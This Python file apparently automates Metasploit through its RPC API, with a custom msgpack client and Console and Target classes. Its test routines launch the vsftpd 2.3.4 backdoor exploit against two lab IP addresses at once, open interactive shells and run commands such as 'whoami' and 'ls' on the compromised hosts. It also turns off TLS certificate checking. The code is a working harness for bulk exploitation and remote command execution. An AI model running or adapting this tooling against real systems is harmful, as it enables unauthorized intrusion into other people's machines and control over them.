import subprocess
import logging
import asyncio
import requests
import uuid
import requests.packages.urllib3
import msgpack
from pymetasploit3.msfrpc import MsfRpcClient
from retry import retry
from typing import List

requests.packages.urllib3.disable_warnings()


logging.basicConfig(
    level=logging.INFO,
    format='%(levelname)s [%(asctime)s] %(filename)s:%(lineno)d - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger('connectionpool')
logger.setLevel(logging.INFO)

def encode(data):
    return msgpack.packb(data)

def decode(data):
    return msgpack.unpackb(data, strict_map_key=False)

def convert(data, encoding="utf-8"):
    """
    Converts all bytestrings to utf8
    """
    if isinstance(data, bytes):  return data.decode(encoding=encoding)
    if isinstance(data, list):   return list(map(lambda iter: convert(iter, encoding=encoding), data))
    if isinstance(data, set):    return set(map(lambda iter: convert(iter, encoding=encoding), data))
    if isinstance(data, dict):   return dict(map(lambda iter: convert(iter, encoding=encoding), data.items()))
    if isinstance(data, tuple):  return map(lambda iter: convert(iter, encoding=encoding), data)
    return data

class RpcClient:
    def __init__(self, password,**kwargs) -> None:
        self.uri = kwargs.get('uri', '/api/')
        self.port = kwargs.get('port', 55553)
        self.host = kwargs.get('server', '127.0.0.1')
        self.ssl = kwargs.get('ssl', False)
        self.token = kwargs.get('token')
        self.encoding = kwargs.get('encoding', 'utf-8')
        self.headers = {"Content-type": "binary/message-pack"}
        if self.token is None:
            self.login(kwargs.get('username', 'msf'), password)

    def add_perm_token(self):
        """
        Add a permanent UUID4 API token
        """
        token = str(uuid.uuid4())
        self.call("auth.token_add", [token])
        return token
    
    def call(self, method, opts=None, is_raw=False):
        if not isinstance(opts, list):
            opts = []
        if method != 'auth.login':
            if self.token is None:
                raise Exception("MsfRPC: Not Authenticated")

        if method != "auth.login":
            opts.insert(0, self.token)

        if self.ssl is True:
            url = "https://%s:%s%s" % (self.host, self.port, self.uri)
        else:
            url = "http://%s:%s%s" % (self.host, self.port, self.uri)

        opts.insert(0, method)
        payload = encode(opts)

        r = self.post_request(url, payload)

        opts[:] = []  # Clear opts list

        if is_raw:
            return r.content

        return convert(decode(r.content), self.encoding)  # convert all keys/vals to utf8

    def login(self, user, password):
        auth = self.call('auth.login', [user, password])
        try:
            if auth['result'] == 'success':
                self.token = auth['token']
                token = self.add_perm_token()   
                self.token = token
                return True
        except Exception:
            raise Exception("MsfRPC: Authentication failed")

    @retry(tries=3, delay=1, backoff=2)
    def post_request(self, url, payload):
        return requests.post(url, data=payload, headers=self.headers, verify=False)




class Console:

    validate_modules = []

    def __init__(self) -> None:
        self.rpc = RpcClient('yourpassword', ssl=True)
        self.client = MsfRpcClient('yourpassword', ssl=True)
        self.exploit = None
        self.attempts = {}
        self.shells = {}

    def get_running_stats(self, id):
        return self.rpc.call('job.info',[id])

    def search_module(self, module_name):
        logging.info(f"searching for module -> {module_name}")
        return self.client.modules.search(module_name)

    def is_valid_module(self, module_name):
        if module_name in Console.validate_modules: return True
        modules_data = self.search_module(module_name)
        for module in modules_data:
            if module_name == module['fullname']: 
                logging.info(f"valid module selected -> {module['fullname']}")
                Console.validate_modules.append(module["fullname"])
                return True
        logging.error(f"invalid module selected -> {module_name}")
        return False

    def get_session_id(self, ip):
        logging.info(f"current sessions data -> {self.client.sessions.list}")
        for id in self.client.sessions.list.keys():
            if self.client.sessions.list[id]["session_host"] == ip:
                return id
        return None

    def is_exploited(self, target):
        sessions = self.client.sessions.list
        for session_id in sessions:
            if sessions[session_id]["target_host"] == target:
                return (True, session_id)
        return (False, None)
    
    async def bulk_interact(self, targets: List, command):
        interacts = []
        for target in targets:
            target: Target
            interacts.append(target.interact(command))
        await asyncio.gather(*interacts)


    def get_sessions(self):
        return self.client.sessions.list

    async def test(self):
        logging.info("before: "+str(self.client.sessions.list))
        #exploit = self.client.modules.use('exploit', "unix/ftp/vsftpd_234_backdoor")
        self.set_payload('exploit/unix/ftp/vsftpd_234_backdoor')
        # self.set_payload('exploit/linux/postgres/postgres_payload')
        self.set_arguments({
            "RHOSTS":"192.168.17.130"
        })
        #exploit_result = exploit.execute(payload='cmd/unix/interact')
        session_id = await self.run_payload('cmd/unix/interact',"192.168.17.130")
        if session_id is None: return
        logging.info("after: "+str(self.client.sessions.list))
        await self.interact(session_id, "whoami","192.168.17.130")
        await asyncio.sleep(5)
        logging.info("wait done")
        await self.interact(session_id, "whoami","192.168.17.130")
        logging.info("payload completd job is done bye")
        # print(client.sessions.list)
        # shell = client.sessions.session('1')
        # shell.write('whoami')
        # print(shell.read())

    async def test2(self):
        targets = {
            "192.168.17.130": ('exploit/unix/ftp/vsftpd_234_backdoor','cmd/unix/interact',{"RHOSTS":"192.168.17.130"}),
            "192.168.17.131": ('exploit/unix/ftp/vsftpd_234_backdoor','cmd/unix/interact',{"RHOSTS":"192.168.17.131"}),
        }
        target1 = Target(self.rpc,"192.168.17.130",self)
        target2 = Target(self.rpc,"192.168.17.131",self)
        target1.set_payload("exploit","exploit/unix/ftp/vsftpd_234_backdoor")
        target2.set_payload("exploit","exploit/unix/ftp/vsftpd_234_backdoor")
        target1.set_arguments({"RHOSTS":"192.168.17.130"})
        target2.set_arguments({"RHOSTS":"192.168.17.131"})
        await asyncio.gather(target1.run_payload("cmd/unix/interact"), target2.run_payload("cmd/unix/interact"))
        await target1.interact("whoami")
        logging.info("waiting for 5 seconds")
        await asyncio.sleep(5)
        await self.bulk_interact([target1, target2], "ls")
        

        # await self.run_payloads(targets)

class Target:
    def __init__(self, rpc: RpcClient, ip, console: Console) -> None:
        self.rpc = rpc
        self.ip = ip
        self.console = console
        self.exploit = None
        self.is_exploited = False
        self.exploit_result = {}
        self.session_id = None
        self.shell = None

    def set_payload(self, mtype, mname):
        if not self.console.is_valid_module(mname):
            logging.error("payload has not been set")
            return
        self.exploit = self.console.client.modules.use(mtype, mname)
    
    def set_arguments(self, arguments):
        if self.exploit is None: return
        for argument in arguments.keys():
            self.exploit[argument] = arguments[argument]

    async def run_payload(self, shell_path, create_shell=True):
        if self.exploit is None: return
        is_exploited, session_id = self.console.is_exploited(self.ip)
        if is_exploited:
            logging.warning(f"target {self.ip} already has a session; session_id -> {session_id} ")
            return session_id

        exploit_result = self.exploit.execute(payload=shell_path)
        self.exploit_result = exploit_result
        exploit_result["ip"] = self.ip
        completed = False
        while not completed:
            logging.info(f"checking status for job -> {exploit_result['job_id']}")
            completed, session_id = await self.is_job_completed(self.ip)
            await asyncio.sleep(1)

        if exploit_result["job_id"] == None or session_id == None:
            logging.error("payload failed")
            return
        self.shell = self.console.client.sessions.session(self.session_id)
        return session_id

    async def is_job_completed(self, ip):
        sessions_data = self.rpc.call("session.list")
        jobs_data = self.rpc.call("job.list")
        job_lookup = self.exploit_result
        lookup_id = job_lookup["job_id"]
        lookup_uuid = job_lookup["uuid"]
        is_job = False
        is_session = False
        session_id = None
        for job_id in jobs_data.keys():
            if str(job_id) == str(lookup_id):
                is_job = True
                break

        for session in sessions_data.keys():
            if sessions_data[session]["exploit_uuid"] == lookup_uuid:
                session_id = session
                is_session = True
                break
        if is_job and not is_session:
            logging.info("job is still running")
            return (False, None)
        if (not is_job and is_session) or (is_job and is_session):
            self.is_exploited = True
            self.session_id = str(session_id)
            logging.info("job completed and a session was created")
            logging.info(f"sesion_id -> {session_id}")
            return (True, session_id)
        if not is_job and not is_session:
            logging.warning("job completed but no session was created")
            return (True, None)
        
    async def interact(self, command):
        if not self.is_exploited: return
        if self.shell is None:
            self.shell = self.console.client.sessions.session(self.session_id)
        logging.info("trying to interact: " + str(self.session_id))
        logging.info(self.shell.write(command))
        logging.info(self.shell.read())